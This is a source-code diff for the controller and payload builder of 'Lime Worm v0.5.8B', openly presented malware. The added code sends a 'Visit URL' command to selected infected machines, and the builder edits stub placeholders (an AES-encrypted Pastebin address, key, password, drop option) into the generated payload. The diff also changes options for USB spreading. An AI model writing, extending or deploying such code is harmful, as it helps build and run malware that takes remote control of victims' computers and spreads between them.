@@ -1,6 +1,6 @@
 ﻿
 '##################################################################
-'##        N Y A N   C A T  |||   Updated on May./07/2018        ##
+'##        N Y A N   C A T  |||   Updated on May./08/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -19,7 +19,7 @@
 '##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
 '##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
 '##                                                              ##
-'##                     .. Lime Worm v0.5.8 ..                   ##
+'##                     .. Lime Worm v0.5.8B ..                   ##
 '##                                                              ##
 '##                                                              ##
 '##                                                              ##
@@ -129,7 +129,7 @@ re:
 
         ContextMenuStrip1.Renderer = New MyRenderer()
 
-        Me.Text = "Lime Worm v0.5.8"
+        Me.Text = "Lime Worm v0.5.8B"
 
         If ToolStripStatusLabel2.Text.Contains("OFF") Then
             ToolStripStatusLabel2.ForeColor = Color.Red
@@ -1118,6 +1118,21 @@ re:
         Next
     End Sub
 
+    Private Sub VisitURLToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles VisitURLToolStripMenuItem.Click
+        Dim URL As String = InputBox("Enter URL", "Visit URL", "http://google.com")
+
+        If String.IsNullOrEmpty(URL) Then
+            Exit Sub
+        Else
+            If Not URL.StartsWith("http") Then
+                URL = "http://" + URL
+            End If
+            For Each x As ListViewItem In L1.SelectedItems
+                S.Send(x.Tag, "Visit" + SPL + URL)
+            Next
+        End If
+    End Sub
+
 
 
 
@@ -1178,19 +1193,19 @@ re:
                                             If ((current.OpCode.Code = Code.Ldstr) And (Not current.Operand Is Nothing)) Then
                                                 Dim str As String = current.Operand.ToString
                                                 If (str = "%Pastebin%") Then
-                                                    current.Operand = Pastebin.Text
+                                                    current.Operand = S_Encryption.AES_Encrypt(Pastebin.Text)
                                                 End If
                                                 If (str = "%EXE%") Then
                                                     current.Operand = EXE.Text
                                                 End If
                                                 If (str = "%SPL%") Then
-                                                    current.Operand = SPL.ToString
+                                                    current.Operand = SPL
                                                 End If
                                                 If (str = "%KEY%") Then
-                                                    current.Operand = BS(Convert.FromBase64String(S_Socket.KEY.ToString))
+                                                    current.Operand = S_Socket.KEY
                                                 End If
                                                 If (str = "%PASS%") Then
-                                                    current.Operand = MYPASS.ToString
+                                                    current.Operand = MYPASS
                                                 End If
                                                 If (str = "%DROP%") Then
                                                         current.Operand = DROP.Checked.ToString
@@ -1249,18 +1264,12 @@ re:
             PATH1.Enabled = True
             PATH2.Enabled = True
             Injection_CHK.Enabled = True
-            USB_CHK.Checked = False
-            PIN_CHK.Checked = False
-            USB_CHK.Enabled = False
-            PIN_CHK.Enabled = False
         Else
             EXE.Enabled = False
             PATH1.Enabled = False
             PATH2.Enabled = False
             Injection_CHK.Enabled = False
             Injection_CHK.Checked = False
-            USB_CHK.Enabled = True
-            PIN_CHK.Enabled = True
         End If
     End Sub
 
@@ -1301,6 +1310,20 @@ re:
             End If
         End If
     End Sub
+
+    'Private Sub Injection_CHK_Click(sender As Object, e As EventArgs) Handles Injection_CHK.Click
+    '   If Injection_CHK.Checked Then
+    '      USB_CHK.Enabled = False
+    '      PIN_CHK.Enabled = False
+    '      USB_CHK.Checked = False
+    '      PIN_CHK.Checked = False
+    '   Else
+    '     USB_CHK.Enabled = True
+    '      PIN_CHK.Enabled = True
+    'End If
+    'End Sub
+
+
 
 
 #End Region
